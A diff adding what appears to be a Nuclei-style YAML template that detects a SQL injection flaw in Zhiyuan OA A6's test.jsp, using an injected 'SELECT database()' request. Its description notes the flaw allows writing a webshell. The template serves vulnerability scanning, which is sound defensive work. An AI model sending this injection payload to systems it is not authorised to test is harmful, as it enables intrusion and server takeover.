@@ -1,0 +1,27 @@
+id: zhiyuanOA-testjsp-sql-injection
+
+info:
+  name: 致远OA A6 test.jsp SQL注入漏洞
+  author: cnaq
+  severity: high 
+  description: 致远OA A6 test.jsp 存在sql注入漏洞，并可以通过注入写入webshell文件控制服务器
+  reference: 
+    - http://wiki.peiqi.tech/wiki/oa/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20test.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
+  tags: zhiyuanOA,sql,injection
+
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20database())"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          
+      - type: word
+        part: body
+        words:
+          - 'database()'
